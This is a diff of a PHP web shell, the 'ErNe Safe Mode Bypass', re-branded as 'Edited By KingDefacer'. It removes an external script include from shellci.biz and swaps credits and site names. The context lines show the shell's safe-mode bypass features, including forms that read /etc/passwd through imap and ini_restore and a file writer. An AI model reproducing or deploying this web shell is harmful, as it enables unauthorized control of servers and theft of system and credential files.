@@ -1,5 +1,4 @@
-<html><head><title>*  ernealizm  * </title><body bgcolor="#000000"><table Width='100%' height='10%' bgcolor='#000000' border='1'>
-<tr><td><center><font size="4" color="#FFFFFF"><span style="background-color: #000000">ErNe Safe Mode Bypass For BiyoSecurity.Net</span>
+<tr><td><center><font size="4" color="#FFFFFF"><span style="background-color: #000000">ErNe Safe Mode Bypass - Edited By KingDefacer</span>
 </font></center></td></tr></table>
 <style type="text/css">
 body,td {
@@ -34,7 +33,6 @@ a:hover {
 .firstalt {BACKGROUND-COLOR: "#000000"}
 .secondalt {BACKGROUND-COLOR: "#000000"}
 </style>
-<SCRIPT SRC=http://www.shellci.biz/yazciz/ciz.js></SCRIPT>
 <SCRIPT language=JavaScript>
 function CheckAll(form) {
 	for (var i=0;i<form.elements.length;i++) {
@@ -54,9 +52,9 @@ function really(d,f,m,t) {
 }
 </SCRIPT></head><body><center>
 <hr width="775" noshade><table width="775" border="0" cellpadding="0">
-<?php
+<?PHP
 
-error_reporting(0);
+error_reporting(7);
 ob_start();
 $mtime = explode(' ', microtime());
 $starttime = $mtime[1] + $mtime[0];
@@ -104,7 +102,7 @@ if  (empty($_POST['erne'] ) ) {
 	}ELSE{
 	$action = '?action=erne';
 	echo "<table Width='100%' height='10%' bgcolor='#000000' border='1'><tr><td><center><font size='6' color='#D0D0D0'>
-Powered By Erne,Ekin0x, Mohajer22, Ja ( Turkey, Suudi Iraq )<br><br>";
+Powered By Erne, KingDefacer, Ekin0x, Mohajer22, Ja ( Turkey, Suudi Iraq )<br><br>";
 
     echo "</font></center></td></tr></table> ";
 
@@ -810,7 +808,6 @@ $tb->headerform(array('content'=>'<FONT COLOR=#9C9C9C>read file ini_restore:</FO
 $tb->headerform(array('content'=>'<FONT COLOR=#9C9C9C>read file or dir with imap:</FONT><br>' .$tb->makeimp('switch','/etc/passwd' ).$tb->makeinput('string','/etc/passwd' ).$tb->makeinput('string','Show','','submit')));
 $tb->headerform(array('content'=>'<FONT COLOR=#9C9C9C>Make file ERORR:</FONT><br>' .$tb->makeinput('ER','Mohajer22.php' ).$tb->makeinput('ER','Write','ER','submit')));
 
-
 // read file SQL ( ) //
 if(empty($_POST['Mohajer22'])){
 } else {
@@ -1349,14 +1346,14 @@ $handle = opendir($path);
 
 
 
-        echo '</FONT><strong><FONT COLOR=#9B9B9B>www.ernealizm.us :</strong><br />';
+        echo '</FONT><strong><FONT COLOR=#9B9B9B>www.alturks.com :</strong><br />';
 
         foreach ($_folders as $folder)
         {
                 echo $folder.'<br />';
         }
 
-        echo '</FONT><strong><FONT COLOR=#9C9C9C>www.hack-medya.org: </strong>'.$i.'</FONT><br />';
+        echo '</FONT><strong><FONT COLOR=#9C9C9C>ernealizm: </strong>'.$i.'</FONT><br />';
 $tb->tdbody ("</td></tr></table>");
 
 $tb->tableheader();
@@ -1454,4 +1451,3 @@ echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
   echo "</textarea>";
 $tb->tdbody ("</td></tr></table>");
 ?>
-
